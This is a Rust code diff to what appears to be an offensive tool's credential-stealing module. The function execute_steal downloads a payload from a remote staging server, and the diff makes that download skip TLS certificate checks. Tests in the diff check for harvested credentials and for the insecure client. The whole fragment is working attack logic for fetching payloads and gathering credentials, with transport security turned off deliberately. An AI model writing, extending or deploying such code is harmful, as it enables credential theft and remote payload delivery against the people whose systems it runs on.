@@ -40,7 +40,12 @@ fn execute_steal(args: Value) -> Result<Value> {
         staging_url.trim_end_matches('/'),
         payload_id
     );
-    let bytes = reqwest::blocking::get(&url)
+    let bytes = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .context("build staging client")?
+        .get(&url)
+        .send()
         .context("staging fetch failed")?
         .error_for_status()
         .context("staging endpoint returned error")?
@@ -161,5 +166,14 @@ mod tests {
         let _ = std::fs::remove_file(&tmp);
         let val = parse_output(&stdout).unwrap();
         assert!(val["credentials"].is_array());
+    }
+
+    #[test]
+    fn staging_client_built_with_invalid_cert_flag() {
+        // Confirms danger_accept_invalid_certs is available in reqwest 0.12 with rustls-tls.
+        let client = reqwest::blocking::Client::builder()
+            .danger_accept_invalid_certs(true)
+            .build();
+        assert!(client.is_ok(), "client builder failed: {:?}", client.err());
     }
 }
